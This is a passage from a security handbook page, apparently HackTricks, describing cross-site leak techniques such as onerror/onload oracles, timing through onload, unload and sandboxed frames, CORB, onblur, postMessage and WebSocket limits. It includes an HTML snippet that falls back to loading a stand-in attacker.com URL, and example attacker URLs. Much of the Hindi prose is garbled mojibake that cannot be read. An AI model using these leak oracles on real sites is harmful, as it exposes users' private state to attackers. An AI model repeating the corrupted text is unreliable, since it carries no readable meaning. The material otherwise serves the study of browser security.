* **Summary**: рдпрджрд┐ рдПрдХ рд╕рдВрд╕рд╛рдзрди рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рддреЛ onerror/onload рдЗрд╡реЗрдВрдЯреНрд╕ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рд╕рдВрд╕рд╛рдзрди рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ/рдЕрд╕рдлрд▓рддрд╛ рд╕реЗ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред
* **Code example**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

рдХреЛрдб рдЙрджрд╛рд╣рд░рдг **JS рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рд▓реЛрдб рдХрд░рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди **рдЕрдиреНрдп рдЯреИрдЧ** рдЬреИрд╕реЗ рдСрдмреНрдЬреЗрдХреНрдЯ, рд╕реНрдЯрд╛рдЗрд▓рд╢реАрдЯ, рдЫрд╡рд┐рдпрд╛рдБ, рдСрдбрд┐рдпреЛрдЬрд╝ рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рдЯреИрдЧ рдХреЛ рд╕реАрдзреЗ** рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛ рдФрд░ рдЯреИрдЧ рдХреЗ рдЕрдВрджрд░ `onload` рдФрд░ `onerror` рдЗрд╡реЗрдВрдЯреНрд╕ рдХреЛ рдШреЛрд╖рд┐рдд рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ (рдЗрд╕рдХреЗ рдмрдЬрд╛рдп рдЗрд╕реЗ JS рд╕реЗ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛)ред

рдЗрд╕ рд╣рдорд▓реЗ рдХрд╛ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ-рд░рд╣рд┐рдд рд╕рдВрд╕реНрдХрд░рдг рднреА рд╣реИ:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In this case if `example.com/404` is not found `attacker.com/?error` will be loaded.

### Onload Timing

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Summary:** The [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** can be used to measure how much time it takes to perform a request. However, other clocks could be used, such as [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) which can identify tasks running for more than 50ms.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) another example in:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

рдпрд╣ рддрдХрдиреАрдХ рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЗ рдХреЗ рд╕рдорд╛рди рд╣реИ, рд▓реЗрдХрд┐рди **attacker** рдХреБрдЫ рдХреНрд░рд┐рдпрд╛ рдХреЛ **рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╕рдордп** рд▓реЗрдиреЗ рдХреЗ рд▓рд┐рдП рднреА **рдмрд▓ рджреЗрдЧрд╛** рдЬрдм **рдЙрддреНрддрд░ рд╕рдХрд╛рд░рд╛рддреНрдордХ рдпрд╛ рдирдХрд╛рд░рд╛рддреНрдордХ** рд╣реЛ рдФрд░ рдЙрд╕ рд╕рдордп рдХреЛ рдорд╛рдкреЗрдЧрд╛ред

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Summary:** The [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) can be used to measure how much time it takes to perform a request. Other clocks could be used.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

The time taken to fetch a resource can be measured by utilizing the [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) and [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) events. The **`beforeunload`** event is fired when the browser is about to navigate to a new page, while the **`unload`** event occurs when the navigation is actually taking place. The time difference between these two events can be calculated to determine the **duration the browser spent fetching the resource**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Summary:** The [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API can be used to measure how much time it takes to perform a request. Other clocks could be used.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

рдпрд╣ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдПрдХ рдкреГрд╖реНрда рдФрд░ рдЗрд╕рдХреЗ рдЙрдк-рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╕рдордп рдХреЛ рдПрдХ **attacker** рджреНрд╡рд╛рд░рд╛ рдорд╛рдкрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдорд╛рдк рдЖрдорддреМрд░ рдкрд░ рд╕рдВрднрд╡ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдПрдХ iframe рдХрд╛ `onload` рд╣реИрдВрдбрд▓рд░ рдХреЗрд╡рд▓ рд╕рдВрд╕рд╛рдзрди рд▓реЛрдбрд┐рдВрдЧ рдФрд░ JavaScript рдирд┐рд╖реНрдкрд╛рджрди рдХреА рд╕рдорд╛рдкреНрддрд┐ рдХреЗ рдмрд╛рдж рд╣реА рд╕рдХреНрд░рд┐рдп рд╣реЛрддрд╛ рд╣реИред рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрди рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдкрд░рд┐рд╡рд░реНрддрдирд╢реАрд▓рддрд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ **attacker** `<iframe>` рдХреЗ рднреАрддрд░ [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рд╕рдорд╛рд╡реЗрд╢ рдХрдИ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ JavaScript рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рдорд╛рдк рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░рджрд░реНрд╢рди рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛрддрд╛ рд╣реИред
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**:
* **Summary**: рдпрджрд┐ рдЖрдк рд╕рд╣реА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рддреЗ рд╕рдордп рдкреГрд╖реНрда рдореЗрдВ рддреНрд░реБрдЯрд┐ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХрд┐рд╕реА рднреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рддреЗ рд╕рдордп рдЗрд╕реЗ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд▓реВрдк рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдмрд┐рдирд╛ рд╕рдордп рдорд╛рдкреЗред
* **Code Example**:

рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рдЖрдк **Iframe рдХреЗ рдЕрдВрджрд░** **рдЧреБрдкреНрдд** рд╕рд╛рдордЧреНрд░реА рд╡рд╛рд▓рд╛ **рдкреГрд╖реНрда** **рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЖрдк **рдкреАрдбрд╝рд┐рдд рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рдЬрд┐рд╕рдореЗрдВ "_**flag**_" рд╣реИ, рдПрдХ **Iframe** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП CSRF рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреЗ рд╣реБрдП)ред Iframe рдХреЗ рдЕрдВрджрд░ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ _**onload event**_ рд╣рдореЗрд╢рд╛ **рдХрдо рд╕реЗ рдХрдо рдПрдХ рдмрд╛рд░** **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрдЧрд╛ред рдлрд┐рд░, рдЖрдк **URL** рдХреЛ **iframe** рдХрд╛ **рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ** рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ **hash** рдХреЗ **рд╕рд╛рдордЧреНрд░реА** рдХреЛ рдмрджрд▓рдХрд░ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

рдпрджрд┐ рдкрд╣рд▓рд╛ URL **рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд▓реЛрдб** рд╣реБрдЖ, рддреЛ, рдЬрдм **hash** рднрд╛рдЧ рдХреЛ **рдмрджрд▓рд╛** рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **onload** рдШрдЯрдирд╛ **рдлрд┐рд░ рд╕реЗ рд╕рдХреНрд░рд┐рдп рдирд╣реАрдВ рд╣реЛрдЧреА**ред рд▓реЗрдХрд┐рди **рдпрджрд┐** рдкреГрд╖реНрда рд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреА **рддреНрд░реБрдЯрд┐** рдереА, рддреЛ, **onload** рдШрдЯрдирд╛ **рдлрд┐рд░ рд╕реЗ рд╕рдХреНрд░рд┐рдп рд╣реЛрдЧреА**ред

рддрдм, рдЖрдк **рд╕рд╣реА** рд▓реЛрдб рдХрд┐рдП рдЧрдП рдкреГрд╖реНрда рдпрд╛ рдкреГрд╖реНрда рдХреЗ рдмреАрдЪ **рдЕрдВрддрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ **рддреНрд░реБрдЯрд┐** рд╣реИ рдЬрдм рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**:
* **Summary:** рдпрджрд┐ **рдкреГрд╖реНрда** **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╕рд╛рдордЧреНрд░реА **рд╡рд╛рдкрд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ**, **рдпрд╛** рдПрдХ **рд╕рд╛рдордЧреНрд░реА** рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ **рдирд┐рдпрдВрддреНрд░рд┐рдд** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдирдХрд╛рд░рд╛рддреНрдордХ рдорд╛рдорд▓реЗ** рдореЗрдВ **рдорд╛рдиреНрдп JS рдХреЛрдб рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рдФрд░ **`<script>`** рдЯреИрдЧ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдпрд╛рд╕ рдХреЛ **рд▓реЛрдб** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП **рдирдХрд╛рд░рд╛рддреНрдордХ** рдорд╛рдорд▓реЛрдВ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХрд╛ **рдХреЛрдб** **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрддрд╛ рд╣реИ, рдФрд░ **рд╕рдХрд╛рд░рд╛рддреНрдордХ** рдорд╛рдорд▓реЛрдВ рдореЗрдВ **рдХреБрдЫ рднреА** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛ред
* **Code Example:**

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code & Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)** рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рд╣реИ рдЬреЛ рд╡реЗрдм рдкреГрд╖реНрдареЛрдВ рдХреЛ рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ **Spectre** рдЬреИрд╕реЗ рд╣рдорд▓реЛрдВ рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдХреА рдЬрд╛ рд╕рдХреЗред рд╣рд╛рд▓рд╛рдБрдХрд┐, рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХреЗ рд╕реБрд░рдХреНрд╖рд╛рддреНрдордХ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЬрдм **CORB** рдХреЗ рдЕрдзреАрди рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ _**CORB protected**_ `Content-Type` рдХреЗ рд╕рд╛рде `nosniff` рдФрд░ `2xx` рд╕реНрдерд┐рддрд┐ рдХреЛрдб рд▓реМрдЯрд╛рддреА рд╣реИ, рддреЛ **CORB** рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╢рд░реАрд░ рдФрд░ рд╣реЗрдбрд░ рдХреЛ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИред рдЗрд╕ рдкрд░ рдирдЬрд╝рд░ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ рд╣рдорд▓рд╛рд╡рд░ рд╕реНрдерд┐рддрд┐ рдХреЛрдб (рд╕рдлрд▓рддрд╛ рдпрд╛ рддреНрд░реБрдЯрд┐ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛) рдФрд░ `Content-Type` (рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ **CORB** рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╣реИ) рдХреЗ рд╕рдВрдпреЛрдЬрди рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рд╣реЛ рд╕рдХрддреА рд╣реИред
* **Code Example**:

рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рд▓рд┐рдВрдХ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: id рдпрд╛ name attribute рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд▓реАрдХ рдХрд░реЗрдВред
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк **iframe** рдХреЗ рдЕрдВрджрд░ рдПрдХ **рдкреГрд╖реНрда** **рд▓реЛрдб рдХрд░реЗрдВ** рдФрд░ **`#id_value`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреГрд╖реНрда рдХреЛ **iframe рдХреЗ рддрддреНрд╡ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗрдВ, рдпрджрд┐ рдПрдХ **`onblur`** рд╕рдВрдХреЗрдд рд╕рдХреНрд░рд┐рдп рд╣реЛрддрд╛ рд╣реИ, рддреЛ ID рддрддреНрд╡ рдореМрдЬреВрдж рд╣реИред\
рдЖрдк **`portal`** рдЯреИрдЧ рдХреЗ рд╕рд╛рде рднреА рд╡рд╣реА рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: postMessage рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЗрдХрдЯреНрдард╛ рдХрд░реЗрдВ рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП postMessages рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* **Code Example**: `Any code listening for all postMessages.`

рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдХреНрд╕рд░ [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рднрд┐рдиреНрди рдореВрд▓реЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрджрд┐ `targetOrigin` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдареАрдХ рд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╡рд┐рдзрд┐ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХрд┐рд╕реА рднреА рд╡рд┐рдВрдбреЛ рдХреЛ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреНрд░рд┐рдпрд╛ рдПрдХ **oracle** рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддреА рд╣реИ; рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреБрдЫ рд╕рдВрджреЗрд╢ рдХреЗрд╡рд▓ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рднреЗрдЬреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд▓реЙрдЧ рдЗрди рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдЗрди рд╕рдВрджреЗрд╢реЛрдВ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдпрд╛ рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдпрд╛ рдкрд╣рдЪрд╛рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдХреНрдпрд╛ рд╡реЗ рдкреНрд░рдорд╛рдгрд┐рдд рд╣реИрдВ рдпрд╛ рдирд╣реАрдВред

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рд╛рдореБрджрд╛рдпрд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣** рдмрдирд╛ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХреЗрдВред\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Limits Techniques

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Usage
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: WebSocket рдХрдиреЗрдХреНрд╢рди рд╕реАрдорд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рдирд╛ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреГрд╖реНрда рдХреЗ WebSocket рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рд▓реАрдХ рдХрд░рддрд╛ рд╣реИред
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

рдпрд╣ рдкрд╣рдЪрд╛рдирдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ рд▓рдХреНрд╖реНрдп рдкреГрд╖реНрда рдХрд┐рддрдиреЗ **WebSocket рдХрдиреЗрдХреНрд╢рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдФрд░ WebSocket рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдпрджрд┐ рдПрдХ **origin** **WebSocket** рдХрдиреЗрдХреНрд╢рди рд╡рд╕реНрддреБрдУрдВ рдХреА **рдЕрдзрд┐рдХрддрдо рдорд╛рддреНрд░рд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХрдиреЗрдХреНрд╢рди рдХреА рд╕реНрдерд┐рддрд┐ рдХреА рдкрд░рд╡рд╛рд╣ рдХрд┐рдП рдмрд┐рдирд╛, **рдирдП рд╡рд╕реНрддреБрдУрдВ рдХрд╛ рдирд┐рд░реНрдорд╛рдг JavaScript рдЕрдкрд╡рд╛рджреЛрдВ рдХрд╛ рдкрд░рд┐рдгрд╛рдо рджреЗрдЧрд╛**ред рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рд▓рдХреНрд╖реНрдп рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ рдПрдХ рдкреЙрдк-рдЕрдк 